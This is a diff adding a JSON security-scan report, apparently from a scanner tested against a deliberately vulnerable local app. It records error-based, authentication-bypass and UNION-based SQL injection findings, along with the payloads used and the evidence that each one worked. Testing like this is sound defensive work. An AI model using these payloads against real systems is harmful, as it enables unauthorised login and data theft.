@@ -1,0 +1,34 @@
+{
+  "target": "http://localhost:4627",
+  "scan_duration_ms": 46,
+  "endpoints_tested": 4,
+  "findings": [
+    {
+      "endpoint": "GET /login (vulnerable)",
+      "vulnerability_type": "Error-Based SQLi",
+      "payload": "'",
+      "evidence": "SQL error leaked in response: \"near \"test\": syntax error\"",
+      "severity": "HIGH"
+    },
+    {
+      "endpoint": "GET /login (vulnerable)",
+      "vulnerability_type": "Authentication Bypass",
+      "payload": "' OR '1'='1' --",
+      "evidence": "Login succeeded with always-true SQL injection; password was never checked",
+      "severity": "CRITICAL"
+    },
+    {
+      "endpoint": "GET /search (vulnerable)",
+      "vulnerability_type": "Union-Based SQLi",
+      "payload": "' UNION SELECT 1,2,3,4 --",
+      "evidence": "Result set grew from 0 to 4 rows — UNION injection exfiltrated extra data",
+      "severity": "HIGH"
+    }
+  ],
+  "summary": {
+    "total_findings": 3,
+    "critical": 1,
+    "high": 2,
+    "safe_endpoints_confirmed": 2
+  }
+}
